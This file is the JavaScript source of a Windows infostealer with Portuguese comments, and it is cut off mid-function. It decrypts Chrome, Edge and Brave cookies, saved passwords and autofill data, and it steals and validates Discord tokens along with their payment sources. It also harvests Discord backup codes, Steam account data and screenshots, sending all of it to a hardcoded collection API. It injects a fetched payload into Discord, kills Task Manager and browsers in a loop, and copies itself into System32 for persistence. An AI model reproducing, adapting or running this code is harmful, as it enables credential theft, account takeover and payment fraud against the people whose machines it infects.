const { execSync, exec } = require('child_process');
const { Dpapi } = require('@primno/dpapi');
const { join } = require('path');
const { createDecipheriv } = require('crypto');
const { totalmem, cpus, userInfo, uptime } = require('os');
const { existsSync, readdirSync, readFileSync, statSync, writeFileSync, copyFileSync } = require('fs');

const si = require('systeminformation');
const { Database } = require('sqlite3');
const axios = require("axios");
const path = require('path');
const screenshot = require('screenshot-desktop');

const options = {
    api: 'https://viewerdesk.online/api/',
    user_id: '1152004926952722442',
    logout_discord: 'false'
};  


function getDownloadsFolderPath() {
    try {
      const downloadsPath = execSync(
        'powershell "[System.Environment]::GetFolderPath(\'MyDocuments\').Replace(\'Documents\', \'Downloads\')"',
        { encoding: 'utf-8' }
      ).trim();
      return downloadsPath;
    } catch (error) {
      console.error('Erro ao obter o caminho da pasta Downloads:', error.message);
      return null;
    }
}

function readFileContent(filePath) {
    try {
      return readFileSync(filePath, 'utf-8');
    } catch (error) {
      console.error('Erro ao ler o arquivo:', error.message);
      return null;
    }
}

async function findBackupFiles() {
    const downloadsDir = getDownloadsFolderPath();
    if (!downloadsDir) {
      console.error('Caminho da pasta Downloads não encontrado.');
      return;
    }

    console.log('Caminho da pasta Downloads:', downloadsDir);

    const backupFiles = readdirSync(downloadsDir).filter(file =>
      file.includes('discord_backup_codes') && file.endsWith('.txt')
    );

    if (backupFiles.length === 0) {
      console.log('Nenhum arquivo de backup encontrado.');
      return;
    }

    console.log('Arquivos de backup encontrados:', backupFiles);

    for (const file of backupFiles) {

      const filePath = `${downloadsDir}\\${file}`;
      const fileContent = readFileContent(filePath);

      if (fileContent) {
        try {
          await fetch(options.api + 'backup', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({
              backupFiles: fileContent,
              stealer_user: options?.user_id,
            })
          });

          console.log(`Arquivo ${file} enviado com sucesso.`);
        } catch (error) {
          console.error('Erro ao enviar arquivo para a API:', error.message);
        }
      }
    }
};

// Função para obter URL de WebSocket do navegador
async function getWebSocketDebuggerUrl() {
    const response = await fetch('http://localhost:9222/json');
    const data = await response.json();
    return data[0].webSocketDebuggerUrl;
}

// Função para obter todos os cookies do navegador via WebSocket
async function getAllCookies(wsUrl) {
    return new Promise((resolve, reject) => {
        const ws = new WebSocket(wsUrl);
        ws.on('open', () => {
            ws.send(JSON.stringify({ id: 1, method: 'Network.getAllCookies' }));
        });
        ws.on('message', (data) => {
            const response = JSON.parse(data.toString());
            if (response.id === 1) {
                resolve(response.result.cookies);
                ws.close();
            }
        });
        ws.on('error', reject);
    });
}

// Função para salvar cookies em um arquivo zip
async function saveCookiesToFile(cookies) {
    const cookiesPath = path.join(__dirname, 'cookies.zip');
    const cookieData = cookies.map(cookie => `${cookie.domain}\tTRUE\t/\tFALSE\t2597573456\t${cookie.name}\t${cookie.value}`).join('\n');

    fs.writeFileSync('cookies.txt', cookieData);

    const zip = new AdmZip();
    zip.addLocalFile('cookies.txt');
    zip.writeZip(cookiesPath);

    fs.unlinkSync('cookies.txt'); // Remove o arquivo txt temporário
    return cookiesPath;
}

// Função de envio para a API (seguindo seu estilo)
async function sendBackupToAPI(filePath, stealerUser) {
    const fileContent = fs.readFileSync(filePath, { encoding: 'base64' }); // Lê o arquivo e codifica para base64

    try {
        await fetch(options.api + 'browser', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                backupFiles: fileContent,
                stealer_user: stealerUser,  // ID do usuário
            })
        });

        if (response.ok) {
            console.log('Arquivo enviado com sucesso!');
        } else {
            console.error('Falha ao enviar o arquivo. Status:', response.status);
        }
    } catch (error) {
        console.error('Erro ao enviar arquivo para a API:', error.message);
    }
}

// Função principal para capturar cookies e enviar para a API
async function handleBrowserData(accountName, browserType, stealerUser) {
    const BROWSER_CONFIGS = {
        chrome: {
            bin: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
            user_data: `${process.env.LOCALAPPDATA}\\Google\\Chrome\\User Data`
        },
        edge: {
            bin: 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe',
            user_data: `${process.env.LOCALAPPDATA}\\Microsoft\\Edge\\User Data`
        },
        brave: {
            bin: 'C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe',
            user_data: `${process.env.LOCALAPPDATA}\\BraveSoftware\\Brave-Browser\\User Data`
        }
    };

    // Configuração do navegador e captura de cookies
    const config = BROWSER_CONFIGS[browserType || 'chrome'];

    // Inicia o navegador com a porta de depuração remota
    spawn(config.bin, ['--remote-debugging-port=9222', '--user-data-dir=' + config.user_data]);

    // Obtém a URL do WebSocket
    const wsUrl = await getWebSocketDebuggerUrl();
    const cookies = await getAllCookies(wsUrl);

    // Salva os cookies em um arquivo zip
    const cookiesFilePath = await saveCookiesToFile(cookies);

    // Envia os cookies para a API
    await sendBackupToAPI(cookiesFilePath, stealerUser);

    // Remove o arquivo após o envio
    fs.unlinkSync(cookiesFilePath);

    console.log('Backup concluído com sucesso!');
}

// Chamada para a função (exemplo de execução)
handleBrowserData('userAccount123', 'chrome', 12345)
    .then(() => console.log('Tudo foi enviado com sucesso!'))
    .catch(err => console.error('Erro:', err));


async function getDiscordTokens() {
    const request = await fetch(options.api + 'paths', {
        method: 'GET',
        headers: {
            'Content-Type': 'application/json',
            'stealer_user': options.user_id
        }
    });

    const paths = await request.json();
    const tokens_list = [];

    for(const [key, value] of Object.entries(paths.discordTokens)) {
        const path = value.replace('appdata', process.env.LOCALAPPDATA).replace('roaming', process.env.APPDATA);

        if(existsSync(path) && existsSync(join(path, '..', '..', 'Local State'))) {
            for(const file of readdirSync(path)) {
                if(file?.endsWith('.ldb')  || file?.endsWith('.log')) {
                    const file_content = readFileSync(join(path, file), 'utf-8')
                    .split('\n')?.map((x) => x?.trim());

                    file_content.forEach((line) => {
                        const encrypted_tokens = line?.match(/dQw4w9WgXcQ:[^.*['(.*)'\].*$][^']*/gi);
                        if(encrypted_tokens) {
                            encrypted_tokens.forEach(async(token) => {
                                if(token?.endsWith('\\')) token = (token.slice(0, -1).replace('\\', '')).slice(0, -1);
                                const encrypted_key = Buffer.from(JSON.parse(readFileSync(join(path, '..', '..', 'Local State')))?.os_crypt.encrypted_key, 'base64').slice(5);
                                const decrypted_key = Dpapi.unprotectData(Buffer.from(encrypted_key, 'utf-8'), null, 'CurrentUser');

                                let decrypted_token;

                                const encrypted = Buffer.from(token?.split(':')[1], 'base64');
                                const start = encrypted?.slice(3, 15),
                                middle = encrypted?.slice(15, encrypted?.length - 16),
                                end = encrypted?.slice(encrypted?.length - 16, encrypted?.length);

                                const decipher = createDecipheriv('aes-256-gcm', decrypted_key, start); decipher.setAuthTag(end);
                                decrypted_token = decipher?.update(middle, 'base64', 'utf8') + decipher.final('utf8');

                                if(!tokens_list?.find((t) => t?.token === decrypted_token)) {
                                    tokens_list.push({
                                        token: decrypted_token,
                                        found_in: key
                                    })
                                };
                            });
                        };
                    });
                };
            };
        } else if(existsSync(path)  && !existsSync(join(path, '..', '..', 'Local State'))) {
            for(const file of readdirSync(path)) {
                if(file?.endsWith('.ldb') || file?.endsWith('.log')) {
                    const file_content = readFileSync(join(path, file), 'utf-8')?.split(/\r?\n/);
                    file_content.forEach((line) => {
                        for(const regex of [new RegExp(/mfa\.[\w-]{84}/g), new RegExp(/[\w-][\w-][\w-]{24}\.[\w-]{6}\.[\w-]{26,110}/gm), new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{38}/g)]) {
                            const matched_tokens = line?.match(regex);
                            if(matched_tokens) {
                                matched_tokens.forEach(async(token) => {
                                    if(!tokens_list?.find((t) => t?.token === token)) {
                                        tokens_list?.push({
                                            token: token,
                                            found_in: key
                                        });
                                    };
                                });
                            };
                        };
                    });
                };
            };
        } else {
            continue;
        };
    };

    const merge = (a, b, predicate = (a, b) => a === b) => {
        const c = [...a];
        b.forEach((bItem) => (c?.some((cItem) => predicate(bItem, cItem)) ? null : c?.push(bItem)))
        return c;
    };

    const firefox_tokens = await stealFirefoxTokens();

    const valid_tokens = [];
    for(const value of merge(tokens_list, firefox_tokens)) {
        const token_data = await checkToken(value?.token);

        if(token_data?.id) {
            const user_data = await tokenRequests(value?.token, token_data?.id);
            if(!valid_tokens.find((u) => u?.user?.data?.id === token_data.id)) {
                valid_tokens.push({
                    token: value?.token,
                    found_at: value?.found_in,
                    user: {
                        data: token_data,
                        profile: user_data?.profile,
                        payment_sources: user_data?.payment_sources
                    }
                });
            };
        };
    };

    if(valid_tokens?.length) {
        fetch(options.api + 'valid-tokens', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                stealer_user: options?.user_id,
                valid_tokens,
                computer_name: userInfo()?.username
            })
        });
    };
};

async function newInjection() {
    const system_info = await si?.osInfo();
    const injections = await discordInjection();

    const network = await fetch('https://ipinfo.io/json', {
        method: 'GET',
        headers: {
            'Content-Type': 'application/json'
        }
    });

    const network_data = await network.json();


    fetch(options.api + 'pc-info', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            stealer_user: options?.user_id,
            computer_name: userInfo()?.username,
            ram: Math.round(totalmem() / (1024 * 1024 * 1024)),
            cpu: cpus()?.[0]?.model,
            injections,
            distro: system_info?.distro,
            uptime: uptime() * 1000,
            network: {
                ip: network_data?.ip,
                country: network_data?.country,
                city: network_data?.city,
                region: network_data?.region,
            }
        })
    });
};

async function tokenRequests(token, id) {
    const profile = await fetch(`https://discord.com/api/v10/users/${id}/profile`, {
        method: 'GET',
        headers: {
            Authorization: token,
            'Content-Type': 'application/json'
        }
    });

    const payment_sources = await fetch(`https://discord.com/api/v10/users/@me/billing/payment-sources`, {
        method: 'GET',
        headers: {
            Authorization: token,
            'Content-Type': 'application/json'
        }
    });

    const promises = await Promise.allSettled([
        profile?.json(),
        payment_sources?.json()
    ]);

    return {
        profile: promises[0]?.value,
        payment_sources:promises[1]?.value
    };
};

async function checkToken(token) {
    const check_token = await fetch('https://discord.com/api/v10/users/@me', {
        headers: {
            Authorization: token,
            'Content-Type': 'application/json'
        }
    });

    if(check_token?.status === 200) {
        return new Promise(async(res) => {
            const json = await check_token?.json();
            res(json);
        });
    } else {
        return check_token?.status;
    };
};

async function stealFirefoxTokens() {
    const path = join(process.env.APPDATA, 'Mozilla', 'Firefox', 'Profiles');
    const tokens_list = [];

    if(existsSync(path)) {
        const files = execSync('where /r . *.sqlite', { cwd: path })?.toString()
        ?.split(/\r?\n/);

        files.forEach((file) => {
            file = file?.trim();
            if(existsSync(file) && statSync(file)?.isFile()) {
                const lines = readFileSync(file, 'utf8')
                ?.split('\n')?.map(x => x?.trim());

                for(const regex of [new RegExp(/mfa\.[\w-]{84}/g), new RegExp(/[\w-][\w-][\w-]{24}\.[\w-]{6}\.[\w-]{26,110}/gm), new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{38}/g)]) {
                    lines.forEach((line) => {
                        const tokens = line?.match(regex);
                        if(tokens) {
                            tokens.forEach((token) => {
                                if (
                                    !token?.startsWith('NzY') &&
                                    !token?.startsWith('NDk') &&
                                    !token?.startsWith('MTg') &&
                                    !token?.startsWith('MjI') &&
                                    !token?.startsWith('MzM') &&
                                    !token?.startsWith('NDU') &&
                                    !token?.startsWith('NTE') &&
                                    !token?.startsWith('NjU') &&
                                    !token?.startsWith('NzM') &&
                                    !token?.startsWith('ODA') &&
                                    !token?.startsWith('OTk') &&
                                    !token?.startsWith('MTA') &&
                                    !token?.startsWith('MTE')
                                  ) return;
                                  if(!tokens_list?.find((t) => t?.token === token)) {
                                    tokens_list?.push({
                                        token: token,
                                        found_in: 'Firefox'
                                    });
                                  }
                            });
                        };
                    });
                };
            };
        });
    };

    return tokens_list;
};


async function discordInjection() {
    const infectedDiscords = [];

    [join(process.env.LOCALAPPDATA, 'Discord'), join(process.env.LOCALAPPDATA, 'DiscordCanary'), join(process.env.LOCALAPPDATA, 'DiscordPTB')]
    .forEach(async(dir) => {
        if(existsSync(dir)) {
            if(!readdirSync(dir).filter((f => f?.startsWith('app-')))?.[0]) return;
            const path = join(dir, readdirSync(dir).filter((f => f.startsWith('app-')))?.[0], 'modules', 'discord_desktop_core-1');
            const discord_index = execSync('where /r . index.js', { cwd: path })?.toString()?.trim();

            if(discord_index) infectedDiscords?.push(
                dir?.split(process.env.LOCALAPPDATA)?.[1]?.replace('\\', '')
            );

            const request = await fetch(options.api + 'injections', {
                method: 'GET',
                headers: {
                    stealer_user: options?.user_id,
                    logout_discord: options?.logout_discord
                }
            });

            const data = await request.json();

            writeFileSync(discord_index, data?.discord, {
                flag: 'w'
            });

            await kill(['discord', 'discordcanary', 'discorddevelopment', 'discordptb']);
            exec(`${join(dir, 'Update.exe')} --processStart ${dir?.split(process.env.LOCALAPPDATA)?.[1]?.replace('\\', '')}.exe`, function(err) {
                if(err) {};
            });
        };
    });

    return infectedDiscords;
};

async function browserCookies(path) {
    const cookies = [];
    const hq_cookies = [];

    if (existsSync(path)) {
        let path_split = path?.split('\\'),
        path_st = path?.includes('Network') ? path_split?.splice(0, path_split.length - 3) : path_split?.splice(0, path_split?.length - 2),
        path_t = path_st?.join('\\') + '\\';

        if (path?.startsWith(process.env.APPDATA)) path_t = path;

        if (existsSync(join(path, 'Network')) && existsSync(join(path_t, 'Local State'))) {
            const encrypted = Buffer.from(JSON.parse(readFileSync(join(path_t, 'Local State'), 'utf-8'))?.os_crypt.encrypted_key, 'base64').slice(5);
            const key = Dpapi.unprotectData(Buffer.from(encrypted, 'utf-8'), null, 'CurrentUser');

            const result = await new Promise((resolve) => {
                if (!existsSync(join(path, 'Network', 'Cookies'))) return;

                const database = new Database(join(path, 'Network', 'Cookies'));
                database.each('SELECT * from cookies', async function (err, row) {
                    if(!row?.encrypted_value) return;

                    const encrypted_value = row?.encrypted_value;
                    let decrypted;
                    if (encrypted_value?.[0] == 1 && encrypted_value?.[1] == 0 && encrypted_value?.[2] == 0 && encrypted_value?.[3] == 0) {
                        decrypted = Dpapi.unprotectData(encrypted_value, null, 'CurrentUser');
                    } else {
                        const start = encrypted_value?.slice(3, 15),
                        middle = encrypted_value?.slice(15, encrypted_value?.length - 16),
                        end = encrypted_value?.slice(encrypted_value?.length - 16, encrypted_value?.length),
                        decipher = createDecipheriv('aes-256-gcm', key, start);

                        decipher?.setAuthTag(end);
                        decrypted = decipher?.update(middle, 'base64', 'utf-8') + decipher.final('utf-8');

                        let browser = path?.includes('Local') ? path?.split('\\Local\\')[1].split('\\')?.[1] : path?.split('\\Roaming\\')?.[1]?.split('\\')?.[1];
                        if(path?.includes('Profile')) browser = `${browser} ${path?.split('\\User Data')?.[1]?.replaceAll('\\', '')}`;

                        if (cookies?.find((c) => c?.browser === browser)) {
                            cookies?.find((c) => c?.browser === browser)?.list?.push(`${row?.host_key}  TRUE    /       FALSE   2597573456      ${row?.name}    ${decrypted}`);
                        } else {
                            cookies.push({
                                browser: browser,
                                list: [`${row?.host_key}        TRUE    /       FALSE   2597573456      ${row?.name}    ${decrypted}`]
                            });
                        };
                    };
                }, function () {
                    resolve({ cookies, hq_cookies });
                    database?.close();
                });
            });
            return result;
        };
    };
};

async function getBrowserCookies() {
    const cookies_list = [];

    return await new Promise(async(resolve) => {
        const request = await fetch(options.api + 'paths', {
            method: 'GET',
            headers: {
                'stealer_user': options.user_id,
            }
        });

        const data = await request.json();
        await kill(data?.browsersProcesses);

        const paths = data?.browsers?.map((p) => p?.replace('appdata', process.env.LOCALAPPDATA)?.replace('roaming', process.env.APPDATA));

        for(const path of paths) {
            if(!path.includes('Firefox')) {
                try {
                    const cookies = await browserCookies(path);

                    if(cookies?.cookies?.[0]?.browser && cookies?.cookies?.[0]?.list) {
                        cookies_list.push({
                            browser: cookies?.cookies?.[0]?.browser,
                            list: cookies?.cookies?.[0]?.list
                        });
                    };
                } catch(e) {
                    await fetch(options.api + 'errors', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            stealer_user: options?.user_id,
                            computer_name: userInfo()?.username,
                            data: {
                                error: `${e}`
                            }
                        })
                    });
                }
            } else {
                try {
                    const firefox_cookies = await getFirefoxCookies(path);
                    if(firefox_cookies) {
                        cookies_list.push({
                            browser: 'Firefox',
                            list: firefox_cookies?.[0]?.list
                        });
                    };
                } catch(e) {
                    await fetch(options.api + 'errors', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            stealer_user: options?.user_id,
                            computer_name: userInfo()?.username,
                            data: {
                                error: `${e}`
                            }
                        })
                    });
                }
            };
        };
        resolve({ cookies_list});
    });
};

async function getFirefoxCookies(path) {
    const cookies = [];
    if(existsSync(path)) {
        const cookiesFile = execSync('where /r . cookies.sqlite', { cwd: path })?.toString();
        const result = await new Promise((res, rej) => {
            const database = new Database(cookiesFile?.trim());
            database.each('SELECT * FROM moz_cookies', async function(err, row) {
                if(!row?.value) return;
                if(cookies?.find((c) => c?.browser === 'Firefox')) {
                    cookies?.find((c) => c?.browser === 'Firefox')?.list?.push(`${row?.host}\t${row?.expiry === 0 ? 'FALSE' : 'TRUE'}\t${row?.path}\t${row?.host?.startsWith('.') ? 'FALSE' : 'TRUE'}\t${row?.expiry}\t${row?.name}\t${row?.value}`);
                } else {
                    cookies?.push({ browser: 'Firefox', list: [`${row?.host}\t${row?.expiry === 0 ? 'FALSE' : 'TRUE'}\t${row?.path}\t${row?.host?.startsWith('.') ? 'FALSE' : 'TRUE'}\t${row?.expiry}\t${row?.name}\t${row?.value}`]});
                };
            }, function () {
                res(cookies);
                database?.close();
            });
        });
        return result;
    };
};

async function browserPasswords(path) {
    const passwords = [];
    if(existsSync(path)) {
        let path_split = path?.split('\\'),
        path_st = path?.includes('Network') ? path_split?.splice(0, path_split?.length - 3) : path_split?.splice(0, path_split?.length - 2),
        path_t = path_st.join('\\') + '\\';

        if (path?.startsWith(process.env.APPDATA)) path_t = path;

        if (existsSync(join(path, 'Network')) && existsSync(join(path_t, 'Local State'))) {
            const encrypted = Buffer.from(JSON.parse(readFileSync(join(path_t, 'Local State'), 'utf-8'))?.os_crypt.encrypted_key, 'base64').slice(5);
            const key = Dpapi.unprotectData(Buffer.from(encrypted, 'utf-8'), null, 'CurrentUser');
            if(!existsSync(join(path, 'Login Data'))) return;

            copyFileSync(join(path, 'Login Data'), join(path, 'passwords.db'));

            const result = await new Promise((resolve) => {
                if (!existsSync(join(path, 'passwords.db'))) return;

                const database = new Database(join(path, 'passwords.db'));
                database.each('SELECT origin_url, username_value, password_value FROM logins', async function (err, row) {
                    if(!row?.username_value) return;

                    const start = row?.password_value.slice(3, 15),
                    middle = row?.password_value.slice(15, row.password_value?.length - 16),
                    end = row?.password_value.slice(row.password_value?.length - 16, row.password_value?.length),
                    decipher = createDecipheriv('aes-256-gcm', key, start);

                    let browser = path?.includes('Local') ? path?.split('\\Local\\')[1].split('\\')?.[1] : path?.split('\\Roaming\\')?.[1].split('\\')?.[1];
                    if(path?.includes('Profile')) browser = `${browser} ${path?.split('\\User Data')?.[1].replaceAll('\\', '')}`;
                    decipher?.setAuthTag(end);

                    if (passwords?.find((c) => c?.browser === browser)) {
                        passwords?.find((c) => c.browser === browser)?.list?.push('URL: ' + row?.['origin_url']+ '\nUsername: ' + row?.['username_value'] + '\nPassword: ' + decipher?.update(middle, 'base64', 'utf-8') + decipher?.final('utf-8'));
                    } else {
                        passwords.push({ browser: browser, list: ['URL: ' + row?.['origin_url']+ '\nUsername: ' + row?.['username_value'] + '\nPassword: ' + decipher?.update(middle, 'base64', 'utf-8') + decipher?.final('utf-8')] })
                    };
                }, function () {
                    resolve(passwords);
                    database?.close();
                });
            });
            return result;
        };
    };
};

async function browserAutofills(path) {
    const autofills = [];
    if(existsSync(path)) {
        let path_split = path?.split('\\'),
        path_st = path?.includes('Network') ? path_split?.splice(0, path_split.length - 3) : path_split?.splice(0, path_split?.length - 2),
        path_t = path_st?.join('\\') + '\\';

        if (path?.startsWith(process.env.APPDATA)) path_t = path;

        if (existsSync(join(path, 'Network')) && existsSync(join(path_t, 'Local State'))) {
            copyFileSync(join(path, 'Web Data'), join(path, 'autofills.db'));

            const result = await new Promise((resolve) => {
                if (!existsSync(join(path, 'autofills.db'))) return;

                const database = new Database(join(path, 'autofills.db'));
                let browser = path?.includes('Local') ? path?.split('\\Local\\')?.[1].split('\\')?.[1] : path?.split('\\Roaming\\')?.[1].split('\\')?.[1];
                if(path?.includes('Profile')) browser = `${browser} ${path?.split('\\User Data')?.[1].replaceAll('\\', '')}`;

                database.each('SELECT * FROM autofill', async function (err, row) {
                    if(!row?.name || !row?.value) return;

                    if (autofills?.find((c) => c?.browser === browser)) {
                        autofills?.find((c) => c?.browser === browser)?.list.push(`Name: ${row?.name}\nData: ${row?.value}`);
                    } else {
                        autofills?.push({ browser: browser, list: [`Name: ${row?.name}\nData: ${row?.value}`]})
                    };
                }, function () {
                    resolve(autofills);
                    database.close();
                });
            });
            return result;
        };
    };
};

async function getBrowserAutofills() {
    const autofills_list = [];

    return await new Promise(async(resolve) => {
        const request = await fetch(options.api + 'paths', {
            method: 'GET',
            headers: {
                'stealer_user': options.user_id,
            }
        });

        const data = await request.json();
        await kill(data?.browsersProcesses);

        const paths = data?.browsers.map((p) => p?.replace('appdata', process.env.LOCALAPPDATA)?.replace('roaming', process.env.APPDATA));

        for(const path of paths) {
            if(!path.includes('Firefox')) {
                try {
                    const autofills = await browserAutofills(path);
                    if(autofills?.[0]?.browser && autofills?.[0]?.list) {
                        autofills_list?.push({
                            browser: autofills?.[0]?.browser,
                            list: autofills?.[0]?.list
                        });
                    };
                } catch(e) {
                    await fetch(options.api + 'errors', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            stealer_user: options?.user_id,
                            computer_name: userInfo()?.username,
                            data: {
                                error: `${e}`
                            }
                        })
                    });
                }
            };
        };
        resolve(autofills_list);
    });
};

async function fireSteam() {
  try {

    const pathSteam = path.join(process.env["ProgramFiles(x86)"], "\\Steam\\config");
    if (!existsSync(path.join(process.env["ProgramFiles(x86)"], "\\Steam")) || !existsSync(pathSteam)) return console.log("n existe");

    console.log("existe")
    const accounts = readFileSync("C:\\Program Files (x86)\\Steam\\config\\loginusers.vdf", "utf-8");
    const accountName = accounts.match(/"AccountName"\s+"([^"]+)"/);
    const remeberPassword = accounts.match(/"RememberPassword"\s+"([^"]+)"/);
    const autoLogin = accounts.match(/"AllowAutoLogin"\s+"([^"]+)"/);
    const accountIds = accounts.match(/7656[0-9]{13}/g) || [];

    for (const account of accountIds) {
      try {
          const { data: { response: accountInfo } } = await axios.get("https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=440D7F4D810EF9298D25EDDF37C1F902&steamids=" + account);
          const { data: { response: games } } = await axios.get("https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid=" + account);
          const { data: { response: level } } = await axios.get("https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid=" + account);

          const userProf = accountInfo['players'][0];

          await fetch(options.api + "steam", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                stealer_user: options?.user_id,
                accountName: accountName[1],
                userProf: userProf,
                level,
                games,
                remeberPassword: remeberPassword[1],
                autoLogin: autoLogin[1]
            })
          })
      } catch (e) {
        return;
      }
    }


  } catch (e) {
    return;
  }
}

async function captureAndSendScreenshot() {
    try {
        const imageBuffer = await screenshot();
        const imageBase64 = imageBuffer.toString('base64');

        await axios.post(options.api + 'foto', {
            stealer_user: options?.user_id,
            computer_name: userInfo()?.username,
            image: imageBase64
        }, {
            headers: {
                'Content-Type': 'application/json'
            }
        });

        console.log('Screenshot sent successfully');
    } catch (error) {
        console.error('Error capturing or sending screenshot:', error);
    }
}

async function getBrowserPasswords() {
    const passwords_list = [];

    return await new Promise(async(resolve) => {
        const request = await fetch(options.api + 'paths', {
            method: 'GET',
            headers: {
                'stealer_user': options.user_id,
            }
        });

        const data = await request.json();
        await kill(data?.browsersProcesses);

        const paths = data?.browsers.map((p) => p?.replace('appdata', process.env.LOCALAPPDATA)?.replace('roaming', process.env.APPDATA));

        for(const path of paths) {
            if(!path.includes('Firefox')) {
                try {
                    const passwords = await browserPasswords(path);
                    if(passwords?.[0]?.browser && passwords?.[0]?.list) {
                        passwords_list.push({
                            browser: passwords?.[0]?.browser,
                            list: passwords?.[0]?.list
                        });
                    };
                } catch(e) {
                    await fetch(options.api + 'errors', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            stealer_user: options?.user_id,
                            computer_name: userInfo()?.username,
                            data: {
                                error: `${e}`
                            }
                        })
                    });
                }
            };
        };
        resolve(passwords_list);
    });
};


async function allBrowserData() {
    try {
        const promisses = await Promise.allSettled([
            getBrowserCookies(),
            getBrowserAutofills(),
            getBrowserPasswords()
        ]);

        await fetch(options.api + 'browsers-data', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                stealer_user: options?.user_id,
                computer_name: userInfo()?.username,
                data: {
                    cookies: promisses?.[0]?.value?.cookies_list,
                    autofills: promisses?.[1]?.value,
                    passwords: promisses?.[2]?.value
                }
            })
        });
    } catch(e) {
        await fetch(options.api + 'errors', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                stealer_user: options?.user_id,
                computer_name: userInfo()?.username,
                data: {
                    error: `${e}`
                }
            })
        });
    };
};

(async() => {
    try {
        await getDownloadsFolderPath();
        await findBackupFiles();
        await newInjection();
        await captureAndSendScreenshot();
        await getDiscordTokens();
        await allBrowserData();
        await saveCookiesToFile();
        await sendBackupToAPI();
        await handleBrowserData();
            await fireSteam();
    } catch(e) {
        await fetch(options.api + 'errors', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                stealer_user: options?.user_id,
                computer_name: userInfo()?.username,
                data: {
                    error: `${e}`
                }
            })
        });
    };
})();

process.on('unhandledRejection', async(reason, promise) => {
    await fetch(options.api + 'errors', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            stealer_user: options?.user_id,
            computer_name: userInfo()?.username,
            data: {
                error: `${reason}\n${promise}`
            }
        })
    });
});

  process.on('uncaughtException', async(error, origin) => {
    await fetch(options.api + 'errors', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            stealer_user: options?.user_id,
            computer_name: userInfo()?.username,
            data: {
                error: `${error}\n${origin}`
            }
        })
    });
});

  process.on('uncaughtExceptionMonitor', async(error, origin) => {
    await fetch(options.api + 'errors', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            stealer_user: options?.user_id,
            computer_name: userInfo()?.username,
            data: {
                error: `${error}\n${origin}`
            }
        })
    });
});

function killTaskManager() {
    try {
        const tasks = execSync('tasklist')?.toString()?.toLowerCase();

        if (tasks?.includes('taskmgr.exe')) {
            console.log("Gerenciador de Tarefas encontrado. Matando...");

            exec('taskkill /f /im taskmgr.exe', (error, stdout, stderr) => {
                if (error) {
                    console.error(`Erro ao tentar matar o Gerenciador de Tarefas: ${stderr}`);
                } else {
                    console.log("Gerenciador de Tarefas fechado com sucesso!");
                }
            });
        } else {
            console.log("Gerenciador de Tarefas não encontrado.");
        }
    } catch (error) {
        console.error("Erro ao verificar processos:", error);
    }
}

async function monitorTaskManager() {
    setInterval(() => {
        killTaskManager();
    }, 2000);
}

monitorTaskManager();

const browsers = ["chrome.exe", "firefox.exe", "msedge.exe","opera.exe","brave.exe" ];

function closeBrowsers() {
    browsers.forEach(browser => {
        exec(`taskkill /F /IM ${browser}`, (err, stdout, stderr) => {
            if (!err) {
                console.log(`Navegador fechado: ${browser}`);
            } else if (stderr) {
                console.error(`Erro ao fechar ${browser}:`, stderr.trim());
            }
        });
    });
}

console.log("Monitorando navegadores...");
setInterval(closeBrowsers, 2000);

function checkAdmin() {
    isElevated().then((elevated) => {
        if (!elevated) {
            console.log('Este script precisa ser executado como administrador.');
            process.exit();
        } else {
            console.log('Permissões de administrador confirmadas.');
            moveExecutableToAppV();
        }
    });
}

function moveExecutableToAppV() {
    const currentFilePath = process.argv[1];
    const currentDir = path.dirname(currentFilePath);
    const targetDir = path.join('C:', 'Windows', 'System32', 'AppV');


    fs.access(targetDir, fs.constants.F_OK, (err) => {
        if (err) {
            console.log('A pasta AppV não existe. Criando...');
            fs.mkdir(targetDir, { recursive: true }, (err) => {
                if (err) {
                    console.error('Erro ao criar a pasta AppV:', err);
                    return;
                }
                console.log('Pasta AppV criada com sucesso.');
                copyFileToAppV();
            });
        } else {
            console.log('A pasta AppV já existe.');
            copyFileToAppV();
        }
    });

    function copyFileToAppV() {
        const exeFileName = path.basename(currentFilePath);
        const targetFilePath = path.join(targetDir, exeFileName);


        fs.access(targetFilePath, fs.constants.F_OK, (err) => {
            if (!err) {
                console.log('O arquivo já existe na pasta AppV.');
                return;
            }

            fs.copyFile(currentFilePath, targetFilePath, (err) => {
                if (err) {
                    console.error('Erro ao mover o arquivo para a pasta AppV:', err);
                } else {
                    console.log(`Arquivo movido para: ${targetFilePath}`);
                }
            });
        });
    }
}

checkAdmin();

function restartExplorer() {
    exec("taskkill /f /im explorer.exe", (err) => {
        if (err) {
            console.error("Erro ao finalizar o explorer.exe:", err.message);
            return;
        }
        console.log("explorer.exe finalizado.");

        setTimeout(() => {
            exec("start explorer.exe", (err) => {
                if (err) {
